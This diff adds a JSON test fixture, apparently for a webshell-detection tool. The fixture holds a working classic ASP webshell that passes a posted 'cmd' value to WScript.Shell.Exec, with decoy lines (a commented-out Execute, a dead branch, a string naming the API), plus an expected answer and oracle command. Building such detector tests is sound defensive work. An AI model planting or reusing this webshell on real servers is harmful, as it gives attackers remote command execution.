@@ -1,0 +1,10 @@
+{
+ "material": "<%@ Language=VBScript %>\n<%\nDim sh, c\nc = Request.Form(\"cmd\")\n' Execute Request(\"code\")   -- removed in fixture\nSet sh = CreateObject(\"WScript.Shell\")\nIf False Then\n  sh.Run \"calc.exe\"\nEnd If\nSet ex = sh.Exec(\"cmd /c \" & c)\nResponse.Write \"sh.Exec is the API name\"\n%>\n",
+ "rep": "webshell",
+ "transform": "live",
+ "key": null,
+ "expected": "10:WScript.Shell.Exec",
+ "note": "webshell-request-primitive-model: lib.codec.webshell_model -> field 'live' (live = `line:api`, comma-joined); source ws_src/ws_asp_stages.asp",
+ "generator_cmd": "python3 -I tests/data/script_fixtures/ws_gen.py tests/data/script_fixtures/ws_src  (stdlib; literal shell sources)",
+ "oracle_cmd": "perl -0ne 's/(?ims)^[ \\t]*If[ \\t]+False[ \\t]+Then[ \\t]*\\n.*?^[ \\t]*End[ \\t]+If/my $m=$&; \"\\n\" x ($m=~tr|\\n||)/ge; s/\"(?:[^\"\\n]|\"\")*\"/\"\"/g; s/(?m)\\x27[^\\n]*//g; @l=split /\\n/; for $i (0..$#l){ print(($i+1).\":WScript.Shell.$1\\n\") while $l[$i]=~/\\.(Run|Exec)\\b/gi }' tests/data/script_fixtures/ws_src/ws_asp_stages.asp | paste -sd,  (perl regex VBScript lexer)"
+}
